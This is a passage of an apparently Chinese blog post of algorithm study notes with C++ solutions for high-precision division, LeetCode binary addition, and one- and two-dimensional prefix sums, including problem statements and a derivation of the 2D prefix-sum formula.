class="hljs-built_in">back</span>()==<span class="hljs-number">0</span>) C.<span class="hljs-built_in">pop_back</span>(); <span class="hljs-comment">//如果有前置零，要去掉前置零</span><br>    <span class="hljs-keyword">return</span> C;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span><span class="hljs-comment">//常规操作</span></span><br><span class="hljs-function"></span>&#123;<br>    string a;<br>    <span class="hljs-type">int</span> b;<br>    vector&lt;<span class="hljs-type">int</span>&gt; A;<br>    cin&gt;&gt;a&gt;&gt;b;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=a.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">0</span>;i--) A.<span class="hljs-built_in">push_back</span>(a[i]-<span class="hljs-string">&#x27;0&#x27;</span>);<br>    <span class="hljs-keyword">auto</span> C=<span class="hljs-built_in">mul</span>(A,b);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=C.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">0</span>;i--) cout&lt;&lt;C[i];<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="高精度除法"><a href="#高精度除法" class="headerlink" title="高精度除法"></a>高精度除法</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs css">给定两个非负整数（不含前导 <span class="hljs-number">0</span>） <span class="hljs-selector-tag">A</span>，<span class="hljs-selector-tag">B</span>，请你计算 <span class="hljs-selector-tag">A</span>/<span class="hljs-selector-tag">B</span> 的商和余数。<br><br>输入格式<br>共两行，第一行包含整数 <span class="hljs-selector-tag">A</span>，第二行包含整数 <span class="hljs-selector-tag">B</span>。<br><br>输出格式<br>共两行，第一行输出所求的商，第二行输出所求余数。<br><br>数据范围<br><span class="hljs-number">1</span>≤<span class="hljs-selector-tag">A</span>的长度≤<span class="hljs-number">100000</span>,<br><span class="hljs-number">1</span>≤<span class="hljs-selector-tag">B</span>≤<span class="hljs-number">10000</span>,<br><span class="hljs-selector-tag">B</span> 一定不为 <span class="hljs-number">0</span><br>输入样例：<br><span class="hljs-number">7</span><br><span class="hljs-number">2</span><br>输出样例：<br><span class="hljs-number">3</span><br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">divide</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp;A,<span class="hljs-type">int</span> b,<span class="hljs-type">int</span>&amp;r)</span><span class="hljs-comment">//将余数传入，利用余数来求值</span></span><br><span class="hljs-function"></span>&#123;<br>    vector&lt;<span class="hljs-type">int</span>&gt; C;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=A.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">0</span>;i--)<span class="hljs-comment">//除法就是上一位的余数*10+这一位然后再除以除数反复得到答案</span><br>    &#123;<br>        r=r*<span class="hljs-number">10</span>+A[i];<br>        C.<span class="hljs-built_in">push_back</span>(r/b);<br>        r%=b;<br>    &#125;<br>    <span class="hljs-built_in">reverse</span>(C.<span class="hljs-built_in">begin</span>(),C.<span class="hljs-built_in">end</span>());<span class="hljs-comment">//因为是正向存储，所以reverse一下</span><br>    <span class="hljs-keyword">while</span>(C.<span class="hljs-built_in">size</span>()&gt;<span class="hljs-number">1</span>&amp;&amp;C.<span class="hljs-built_in">back</span>()==<span class="hljs-number">0</span>) C.<span class="hljs-built_in">pop_back</span>();<span class="hljs-comment">//删除前置零</span><br>    <span class="hljs-keyword">return</span> C;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span><span class="hljs-comment">//前面都一样</span></span><br><span class="hljs-function"></span>&#123;<br>    string a;<br>    <span class="hljs-type">int</span> b,r=<span class="hljs-number">0</span>;<br>    cin&gt;&gt;a&gt;&gt;b;<br>    vector&lt;<span class="hljs-type">int</span>&gt; A;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=a.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">0</span>;i--) A.<span class="hljs-built_in">push_back</span>(a[i]-<span class="hljs-string">&#x27;0&#x27;</span>);<br>    <span class="hljs-keyword">auto</span> C=<span class="hljs-built_in">divide</span>(A,b,r);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=C.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">0</span>;i--) cout&lt;&lt;C[i];<br>    cout&lt;&lt;endl&lt;&lt;r&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="leetcode67题"><a href="#leetcode67题" class="headerlink" title="leetcode67题"></a>leetcode67题</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">67</span>. 二进制求和<br>给你两个二进制字符串，返回它们的和（用二进制表示）。<br>输入为 非空 字符串且只包含数字 <span class="hljs-number">1</span> 和 <span class="hljs-number">0</span>。<br><br>示例 <span class="hljs-number">1</span>:<br>输入: <span class="hljs-selector-tag">a</span> = <span class="hljs-string">&quot;11&quot;</span>, <span class="hljs-selector-tag">b</span> = <span class="hljs-string">&quot;1&quot;</span><br>输出: <span class="hljs-string">&quot;100&quot;</span><br>示例 <span class="hljs-number">2</span>:<br>输入: <span class="hljs-selector-tag">a</span> = <span class="hljs-string">&quot;1010&quot;</span>, <span class="hljs-selector-tag">b</span> = <span class="hljs-string">&quot;1011&quot;</span><br>输出: <span class="hljs-string">&quot;10101&quot;</span><br><br>提示：<br>每个字符串仅由字符 <span class="hljs-string">&#x27;0&#x27;</span> 或 <span class="hljs-string">&#x27;1&#x27;</span> 组成。<br><span class="hljs-number">1</span> &lt;= <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.length</span>, <span class="hljs-selector-tag">b</span><span class="hljs-selector-class">.length</span> &lt;= <span class="hljs-number">10</span>^<span class="hljs-number">4</span><br>字符串如果不是 <span class="hljs-string">&quot;0&quot;</span> ，就都不含前导零。<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//高精度加法的思想</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">string <span class="hljs-title">addBinary</span><span class="hljs-params">(string a, string b)</span> </span>&#123;<br>       vector&lt;<span class="hljs-type">int</span>&gt;A,B;<br>       <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=a.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">0</span>;i--) A.<span class="hljs-built_in">push_back</span>(a[i]-<span class="hljs-string">&#x27;0&#x27;</span>);<br>       <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=b.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">0</span>;i--) B.<span class="hljs-built_in">push_back</span>(b[i]-<span class="hljs-string">&#x27;0&#x27;</span>);<br>       string C;<br>       <span class="hljs-type">int</span> t=<span class="hljs-number">0</span>;<br>       <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;A.<span class="hljs-built_in">size</span>()||i&lt;B.<span class="hljs-built_in">size</span>();i++)<br>       &#123;<br>           <span class="hljs-keyword">if</span>(i&lt;A.<span class="hljs-built_in">size</span>()) t+=A[i];<br>           <span class="hljs-keyword">if</span>(i&lt;B.<span class="hljs-built_in">size</span>()) t+=B[i];<br>           C+=(t%<span class="hljs-number">2</span>+<span class="hljs-string">&#x27;0&#x27;</span>);<br>           t/=<span class="hljs-number">2</span>;<br>       &#125;<br>       <span class="hljs-keyword">if</span>(t) C+=(<span class="hljs-number">1</span>+<span class="hljs-string">&#x27;0&#x27;</span>);<br>       <span class="hljs-built_in">reverse</span>(C.<span class="hljs-built_in">begin</span>(),C.<span class="hljs-built_in">end</span>());<br>       <span class="hljs-keyword">return</span> C;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="前缀和"><a href="#前缀和" class="headerlink" title="前缀和"></a>前缀和</h1><h2 id="一维前缀和"><a href="#一维前缀和" class="headerlink" title="一维前缀和"></a>一维前缀和</h2><p>将A[1]+……A[n] (n为变量)的值一一单独存入另一个数组中，然后查找区间的前缀和时，只要S[R]-S[L-1]即可得到区间前缀和（为啥是l-1，因为S[R]&#x3D;A[1]+….A[R]，S[L-1]&#x3D;A[1]+….+A[L-1],两个相减就可以得到A[L]+…+A[R]</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-number">795</span> 前缀和<br>输入一个长度为 <span class="hljs-built_in">n</span> 的整数序列。<br><br>接下来再输入 m 个询问，每个询问输入一对 l,r。<br><br>对于每个询问，输出原序列中从第 l 个数到第 r 个数的和。<br><br>输入格式<br>第一行包含两个整数 <span class="hljs-built_in">n</span> 和 m。<br><br>第二行包含 <span class="hljs-built_in">n</span> 个整数，表示整数数列。<br><br>接下来 m 行，每行包含两个整数 l 和 r，表示一个询问的区间范围。<br><br>输出格式<br>共 m 行，每行输出一个询问的结果。<br><br>数据范围<br><span class="hljs-number">1</span>≤l≤r≤<span class="hljs-built_in">n</span>,<br><span class="hljs-number">1</span>≤<span class="hljs-built_in">n</span>,m≤<span class="hljs-number">100000</span>,<br>−<span class="hljs-number">1000</span>≤数列中元素的值≤<span class="hljs-number">1000</span><br>输入样例：<br><span class="hljs-number">5</span> <span class="hljs-number">3</span><br><span class="hljs-number">2</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">6</span> <span class="hljs-number">4</span><br><span class="hljs-number">1</span> <span class="hljs-number">2</span><br><span class="hljs-number">1</span> <span class="hljs-number">3</span><br><span class="hljs-number">2</span> <span class="hljs-number">4</span><br>输出样例：<br><span class="hljs-number">3</span><br><span class="hljs-number">6</span><br><span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1e5</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> q[N],s[N];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    ios::<span class="hljs-built_in">sync_with_stdio</span>(<span class="hljs-literal">false</span>);<br>    <span class="hljs-type">int</span> n,m;<br>    cin&gt;&gt;n&gt;&gt;m;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) cin&gt;&gt;q[i];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) s[i]=s[i<span class="hljs-number">-1</span>]+q[i];<br>    <span class="hljs-keyword">while</span>(m--)<br>    &#123;<br>        <span class="hljs-type">int</span> l,r;<br>        cin&gt;&gt;l&gt;&gt;r;<br>        cout&lt;&lt;s[r]-s[l<span class="hljs-number">-1</span>]&lt;&lt;endl;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="leetcode303"><a href="#leetcode303" class="headerlink" title="leetcode303"></a>leetcode303</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">303.</span> 区域和检索 <span class="hljs-operator">-</span> 数组不可变<br>给定一个整数数组  nums，处理以下类型的多个查询:<br><br>计算索引 <span class="hljs-keyword">left</span> 和 <span class="hljs-keyword">right</span> （包含 <span class="hljs-keyword">left</span> 和 <span class="hljs-keyword">right</span>）之间的 nums 元素的 和 ，其中 <span class="hljs-keyword">left</span> <span class="hljs-operator">&lt;=</span> <span class="hljs-keyword">right</span><br>实现 NumArray 类：<br><br>NumArray(<span class="hljs-type">int</span>[] nums) 使用数组 nums 初始化对象<br><span class="hljs-type">int</span> sumRange(<span class="hljs-type">int</span> i, <span class="hljs-type">int</span> j) 返回数组 nums 中索引 <span class="hljs-keyword">left</span> 和 <span class="hljs-keyword">right</span> 之间的元素的 总和 ，包含 <span class="hljs-keyword">left</span> 和 <span class="hljs-keyword">right</span> 两点（也就是 nums[<span class="hljs-keyword">left</span>] <span class="hljs-operator">+</span> nums[<span class="hljs-keyword">left</span> <span class="hljs-operator">+</span> <span class="hljs-number">1</span>] <span class="hljs-operator">+</span> ... <span class="hljs-operator">+</span> nums[<span class="hljs-keyword">right</span>] )<br> <br><br>示例 <span class="hljs-number">1</span>：<br><br>输入：<br>[&quot;NumArray&quot;, &quot;sumRange&quot;, &quot;sumRange&quot;, &quot;sumRange&quot;]<br>[[[<span class="hljs-number">-2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">-5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">-1</span>]], [<span class="hljs-number">0</span>, <span class="hljs-number">2</span>], [<span class="hljs-number">2</span>, <span class="hljs-number">5</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">5</span>]]<br>输出：<br>[<span class="hljs-keyword">null</span>, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">-3</span>]<br><br>解释：<br>NumArray numArray <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> NumArray([<span class="hljs-number">-2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">-5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">-1</span>]);<br>numArray.sumRange(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>); <span class="hljs-operator">/</span><span class="hljs-operator">/</span> <span class="hljs-keyword">return</span> <span class="hljs-number">1</span> ((<span class="hljs-number">-2</span>) <span class="hljs-operator">+</span> <span class="hljs-number">0</span> <span class="hljs-operator">+</span> <span class="hljs-number">3</span>)<br>numArray.sumRange(<span class="hljs-number">2</span>, <span class="hljs-number">5</span>); <span class="hljs-operator">/</span><span class="hljs-operator">/</span> <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span> (<span class="hljs-number">3</span> <span class="hljs-operator">+</span> (<span class="hljs-number">-5</span>) <span class="hljs-operator">+</span> <span class="hljs-number">2</span> <span class="hljs-operator">+</span> (<span class="hljs-number">-1</span>)) <br>numArray.sumRange(<span class="hljs-number">0</span>, <span class="hljs-number">5</span>); <span class="hljs-operator">/</span><span class="hljs-operator">/</span> <span class="hljs-keyword">return</span> <span class="hljs-number">-3</span> ((<span class="hljs-number">-2</span>) <span class="hljs-operator">+</span> <span class="hljs-number">0</span> <span class="hljs-operator">+</span> <span class="hljs-number">3</span> <span class="hljs-operator">+</span> (<span class="hljs-number">-5</span>) <span class="hljs-operator">+</span> <span class="hljs-number">2</span> <span class="hljs-operator">+</span> (<span class="hljs-number">-1</span>))<br> <br><br>提示：<br><br><span class="hljs-number">1</span> <span class="hljs-operator">&lt;=</span> nums.length <span class="hljs-operator">&lt;=</span> <span class="hljs-number">104</span><br><span class="hljs-number">-105</span> <span class="hljs-operator">&lt;=</span> nums[i] <span class="hljs-operator">&lt;=</span> <span class="hljs-number">105</span><br><span class="hljs-number">0</span> <span class="hljs-operator">&lt;=</span> i <span class="hljs-operator">&lt;=</span> j <span class="hljs-operator">&lt;</span> nums.length<br>最多调用 <span class="hljs-number">104</span> 次 sumRange 方法<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">NumArray</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;<span class="hljs-type">int</span>&gt;sum;<br>    <span class="hljs-built_in">NumArray</span>(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums) &#123;<br>        sum.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=nums.<span class="hljs-built_in">size</span>();i++)<br>           sum.<span class="hljs-built_in">push_back</span>(sum[i<span class="hljs-number">-1</span>]+nums[i<span class="hljs-number">-1</span>]);<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">sumRange</span><span class="hljs-params">(<span class="hljs-type">int</span> left, <span class="hljs-type">int</span> right)</span> </span>&#123;<br>       <span class="hljs-keyword">return</span> sum[right+<span class="hljs-number">1</span>]-sum[left];<br>    &#125;<br>&#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Your NumArray object will be instantiated and called as such:</span><br><span class="hljs-comment"> * NumArray* obj = new NumArray(nums);</span><br><span class="hljs-comment"> * int param_1 = obj-&gt;sumRange(left,right);</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><h2 id="二维前缀和"><a href="#二维前缀和" class="headerlink" title="二维前缀和"></a>二维前缀和</h2><p>二维前缀和推导<br>如图：<img src="https://s2.loli.net/2022/04/16/SfGoOxAmku5Dild.png" alt="&lt;img src=&quot;https://img-blog.csdnimg.cn/20201214201734653.png&quot;   width=&quot;50%&quot;&gt;"></p><p>紫色面积是指(1,1)左上角到(i,j-1)右下角的矩形面积, 绿色面积是指(1,1)左上角到(i-1, j )右下角的矩形面积。每一个颜色的矩形面积都代表了它所包围元素的和。<img src="https://s2.loli.net/2022/04/16/4i6l5raRcU7zgQX.png" alt="在这里插入图片描述"></p><p>从图中我们很容易看出，整个外围蓝色矩形面积s[i] [j] &#x3D; 绿色面积s[i-1] [j] + 紫色面积s[i] [j-1] - 重复加的红色的面积s[i-1] [j-1]+小方块的面积a[i] [j];</p><p>因此得出二维前缀和预处理公式</p><p>s[i] [j] &#x3D; s[i-1] [j] + s[i] [j-1 ] + a[i] [j] - s[i-1] [ j-1] (是离散的数，不是面积哈)</p><p>接下来回归问题去求以(x1,y1)为左上角和以(x2,y2)为右下角的矩阵的元素的和。</p><p>如图：<img src="https://s2.loli.net/2022/04/16/B9GnoqSmsPZfFpC.png" alt="&lt;img src=&quot;https://img-blog.csdnimg.cn/20201214204543274.png&quot;   width=&quot;50%&quot;&gt;"></p><p>紫色面积是指 ( 1,1 )左上角到(x1-1,y2)右下角的矩形面积 ，黄色面积是指(1,1)左上角到(x2,y1-1)右下角的矩形面积；</p><p>不难推出：<img src="https://s2.loli.net/2022/04/16/jdTypKLX8qQ1tbA.png" alt="在这里插入图片描述"></p><p>绿色矩形的面积 &#x3D; 整个外围面积s[x2, y2] - 黄色面积s[x2, y1 - 1] - 紫色面积s[x1 - 1, y2] + 重复减去的红色面积 s[x1 - 1, y1 - 1]</p><p>因此二维前缀和的结论为：</p><p>以(x1, y1)为左上角，(x2, y2)为右下角的子矩阵的和为：<br>s[x2, y2] - s[x1 - 1, y2] - s[x2, y1 - 1] + s[x1 - 1, y1 - 1]</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs tap">796 二维前缀和<br>输入一个 n 行 m 列的整数矩阵，再输入 q 个询问，每个询问包含四个整数 x1,y1,x2,y2，表示一个子矩阵的左上角坐标和右下角坐标。<br><br>对于每个询问输出子矩阵中所有数的和。<br><br>输入格式<br>第一行包含三个整数 n，m，q。<br><br>接下来 n 行，每行包含 m 个整数，表示整数矩阵。<br><br>接下来 q 行，每行包含四个整数 x1,y1,x2,y2，表示一组询问。<br><br>输出格式<br>共 q 行，每行输出一个询问的结果。<br><br>数据范围<br>1≤n,m≤1000,<br>1≤q≤200000,<br>1≤x1≤x2≤n,<br>1≤y1≤y2≤m,<br>−1000≤矩阵内元素的值≤1000<br>输入样例：<br>3<span class="hljs-number"> 4 </span>3<br>1<span class="hljs-number"> 7 </span>2 4<br>3<span class="hljs-number"> 6 </span>2 8<br>2<span class="hljs-number"> 1 </span>2 3<br>1<span class="hljs-number"> 1 </span>2 2<br>2<span class="hljs-number"> 1 </span>3 4<br>1<span class="hljs-number"> 3 </span>3 4<br>输出样例：<br>17<br>27<br>21<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e3</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> a[N][N],s[N][N];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n,m,q;<br>    cin&gt;&gt;n&gt;&gt;m&gt;&gt;q;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>      <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=m;j++)<br>       <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;a[i][j]);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>      <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=m;j++)<br>         s[i][j]=s[i<span class="hljs-number">-1</span>][j]+s[i][j<span class="hljs-number">-1</span>]-s[i<span class="hljs-number">-1</span>][j<span class="hljs-number">-1</span>]+a[i][j];<br>    <span class="hljs-keyword">while</span>(q--)<br>    &#123;<br>        <span class="hljs-type">int</span> x1,x2,y1,y2;<br>        cin&gt;&gt;x1&gt;&gt;y1&gt;&gt;x2&gt;&gt;y2;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,s[x2][y2]-s[x1<span class="hljs-number">-1</span>][y2]-s[x2][y1<span class="hljs-number">-1</span>]+s[x1<span class="hljs-number">-1</span>][y1<span class="hljs-number">-1</span>]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="leetcode304"><a href="#leetcode304" class="headerlink" title="leetcode304"></a>leetcode304</h3><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td 